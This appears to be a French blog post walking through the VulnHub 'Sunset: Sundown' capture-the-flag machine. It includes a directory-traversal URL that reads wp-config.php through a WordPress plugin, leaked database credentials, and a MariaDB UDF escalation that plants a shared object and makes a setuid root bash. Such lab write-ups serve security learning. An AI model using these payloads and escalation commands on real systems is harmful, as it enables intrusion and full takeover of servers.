---
title: "Solution du CTF Sunset: Sundown de VulnHub"
tags: [CTF, VulnHub]
---

Le CTF [Sundown](https://vulnhub.com/entry/sunset-sundown,530/) est l'avant-dernier de la série Sunset au moment de ces lignes. Il s'agit d'un boot2root disponible sur _VulnHub_.

On peut lancer un scan `Nmap` avec la commande suivante ce qui permet d'avoir un listing de vulnérabilités liées aux versions logicielles détectées ainsi que plus d'informations sur certaines applications.

```bash
sudo nmap -p- -sCV -T5 --script vuln 192.168.56.167
```

Ici on obtient la version du Wordpress présent ainsi que les noms d'utilisateur (uniquement `admin` ici).

```
| http-enum: 
|   /wp-login.php: Possible admin folder
|   /wp-json: Possible admin folder
|   /robots.txt: Robots file
|   /readme.html: Wordpress version: 2 
|   /: WordPress version: 5.4.2
|   /feed/: Wordpress version: 5.4.2
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|   /readme.html: Interesting, a readme.
|_  /0/: Potentially interesting folder
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-wordpress-users: 
| Username found: admin
```

On pourrait lancer `wpscan` pour énumérer les plugins installés, mais un coup d'œil au code source permet parfois de se faire une idée rapide :

```html
<script type="text/javascript">
	var SpritzSettings = {
		clientId		: "",
		redirectUri		: "http://192.168.56.167/wp-content/plugins/wp-with-spritz/wp.spritz.login.success.html",
		};
```

Sur _exploit-db_ on trouve cet advisory pour une faille concernant le plugin :

[WordPress Plugin WP with Spritz 1.0 - Remote File Inclusion - PHP webapps Exploit](https://www.exploit-db.com/exploits/44544)

Malgré le titre de la page, il ne s'agit pas d'une inclusion, mais juste d'un directory traversal. C'est suffisant pour faire afficher le contenu du fichier de configuration de Wordpress avec cette URL :

```
http://192.168.56.167/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../wp-config.php
```

On y trouve des identifiants de base de données. Le MySQL n'étant pas exposé, on garde ça sous le bras et on continue l'exploration.

```php

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress_db' );

/** MySQL database username */
define( 'DB_USER', 'root' );

/** MySQL database password */
define( 'DB_PASSWORD', 'VjFSQ2IyRnNUak5pZWpCTENnPT0K' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
```

Un utilisateur nommé `carlos` est présent sur le système.

```
carlos:x:1000:1000:carlos,,,:/home/carlos:/bin/bash
```

On peut se connecter sur le serveur via SSH avec les identifiants `carlos` / `carlos` et obtenir le premier flag.

```console
carlos@sundown:~$ cat local.txt 
28f84888f6bd690e321cba14659b32f2
```

Dans la liste des processus je remarque que mysql tourne avec le compte root :

```
root       330  0.0  0.0   2388   760 ?        Ss   15:27   0:00 /bin/sh -c /usr/sbin/mysqld
root       332  6.6 10.5 1275980 106892 ?      Sl   15:27   2:28 /usr/sbin/mysqld
```

On peut procéder à une escalade de privilèges via un plugin UDF comme je l'ai fait sur le CTF [Raven 2]({% link _posts/2023-04-02-Solution-du-CTF-Raven-2-de-VulnHub.md %}) :

```console
carlos@sundown:/etc$ mysql -u root -pVjFSQ2IyRnNUak5pZWpCTENnPT0K
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 130856
Server version: 10.3.23-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> select @@plugin_dir;
+---------------------------------------------+
| @@plugin_dir                                |
+---------------------------------------------+
| /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ |
+---------------------------------------------+
1 row in set (0.000 sec)

MariaDB [(none)]> select binary 0x7f454c460201010--- snip ---01000000000000000000000000000000 into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/udfbackdoor.so';
Query OK, 1 row affected (0.001 sec)

MariaDB [(none)]> create function sys_exec returns int soname 'udfbackdoor.so';
Query OK, 0 rows affected (0.001 sec)

MariaDB [(none)]> select * from mysql.func where name='sys_exec';
+----------+-----+----------------+----------+
| name     | ret | dl             | type     |
+----------+-----+----------------+----------+
| sys_exec |   2 | udfbackdoor.so | function |
+----------+-----+----------------+----------+
1 row in set (0.000 sec)

MariaDB [(none)]> select sys_exec('cp /bin/bash /tmp/bash && chmod +s /tmp/bash');
+----------------------------------------------------------+
| sys_exec('cp /bin/bash /tmp/bash && chmod +s /tmp/bash') |
+----------------------------------------------------------+
|                                                        0 |
+----------------------------------------------------------+
1 row in set (0.010 sec)
```

On retrouve alors un shell setuid root dans `/tmp` :

```console
carlos@sundown:/tmp$ ls -al bash
-rwsr-s--x 1 root root 1168776 Apr  9 16:08 bash
carlos@sundown:/tmp$ ./bash -p
bash-5.0# id
uid=1000(carlos) gid=1000(carlos) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),1000(carlos)
bash-5.0# cd /root
bash-5.0# ls
proof.txt
bash-5.0# cat proof.txt 
                              _____,,,\//,,\\,/,
                             /-- --- --- -----
                            ///--- --- -- - ----
                           o////- ---- --- --
                           !!//o/---  -- --
                         o*) !///,~,,\\,\/,,/,//,,
                           o!*!o'(\          /\
                         | ! o ",) \/\  /\  /  \/\
                        o  !o! !!|    \/  \/     /
                       ( * (  o!'; |\   \       /
                        o o ! * !` | \  /       \
                       o  |  o 'o| | :  \       /
                        *  o !*!': |o|  /      /
                            (o''| `| : /      /
                            ! *|'`  \|/       \\
                           ' !o!':\  \\        \
                            ( ('|  \  `._______/
////\\\,,\///,,,,\,/oO._*  o !*!'`  `.________/
  ---- -- ------- - -oO*OoOo (o''|           /
    --------  ------ 'oO*OoO!*|'o!!          \
-------  -- - ---- --* oO*OoO *!'| '         /
 ---  -   -----  ---- - oO*OoO!!':o!'       /
 - -  -----  -  --  - *--oO*OoOo!`         /
   \\\\\,,,\\,//////,\,,\\\/,,,\,,ejm/AMC

510252fabb4b7e7dddd7373b7b3da3e8

Thanks for playing - Felipe Winsnes (@whitecr0wz)
```

